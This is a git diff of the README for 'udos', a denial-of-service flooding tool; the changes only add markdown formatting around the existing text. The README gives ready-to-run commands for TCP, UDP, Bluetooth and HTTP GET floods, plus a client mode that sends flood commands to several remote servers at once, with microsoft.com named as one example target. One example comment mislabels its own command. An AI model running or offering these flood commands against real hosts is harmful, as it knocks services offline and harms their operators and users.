@@ -1,3 +1,4 @@
+```
 usage: udos [-h] [--version] [--fork] [--run] [--stop] [--debug]
             [--socket SOCKET] [--client CLIENT] [--server] [--target TARGET]
             [--port PORT] [--bytes BYTES]
@@ -20,20 +21,27 @@ optional arguments:
                    ethernet/wireless)
   --port PORT      destination port
   --bytes BYTES    number of bytes to send in one packet
+```
 
 Examples:
+==============
+
 udos --target 1.1.1.1 --port 80 --socket tcp --bytes 256 # TCP flood 1.1.1.1:80 with 256 byte packets
 udos --target 2.2.2.2 --port 21 --socket udp --bytes 1024 # TCP flood 1.1.1.1:80 with 1024 byte packets
 udos --target 00:11:22:33:44  --socket rfc --bytes 668 # Bluetooth ping flood 00:11:22:33:44 with 668 byte packets
 udos --target http://localhost  --socket http --port 80  # HTTP GET flood on localhost, make many index.php requests as possible
 
 Server mode examples:
+==============
 udos --server --debug # Run first server with verboose output, it will listen on all interfaces
 udos --server --debug # Run second server on other machine with ip eg. 8.8.8.2
 
 Server's remote controlling:
+==============
 udos --client "192.168.0.100:8020, 8.8.8.2:8020" --run --target microsoft.com --port 80 --socket http  # set parameters and fire. Commands will be sent to two servers specified in --client
 
+
+```
 Changelog:
 19.06.2014 (v.2.0) <webnull.www@gmail.com>:
     + Rewrited code using Panthera Desktop Framework
@@ -52,3 +60,4 @@ Changelog:
 18.07.2011 (v1.1):
     + Added support for HTTP GET flood
     + Created changelog
+```
